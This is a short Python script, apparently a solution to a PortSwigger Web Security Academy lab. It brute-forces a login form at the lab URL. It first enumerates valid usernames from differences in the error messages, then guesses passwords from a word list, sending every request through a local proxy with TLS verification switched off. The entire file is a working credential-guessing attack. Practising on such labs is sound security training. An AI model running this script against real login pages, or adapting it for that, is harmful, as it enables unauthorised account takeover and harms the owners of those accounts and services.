import requests,urllib3

from functions import usernames,passwords

# Disable SSL warnings for unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {
    "http" : "127.0.0.1:8080",
    "https" : "127.0.0.1:8080",
}

url = "https://0a510091044d65f781f4163900ae00f9.web-security-academy.net/login"

found = False

for username in usernames:
    data = {
        "username" : username,
        "password" : "123"
    }

    response = requests.post(url=url,data=data,proxies=proxies,verify=False)

    if "Invalid username" not in response.text:

        print("username = ",username)

        for password in passwords:
            data = {
                "username" : username,
                "password" : password,
            }

            response = requests.post(url=url,data=data,proxies=proxies,verify=False)

            if "Incorrect password" not in response.text:
                print("password = ",password)
                found = True
                break
    if found == True:
        break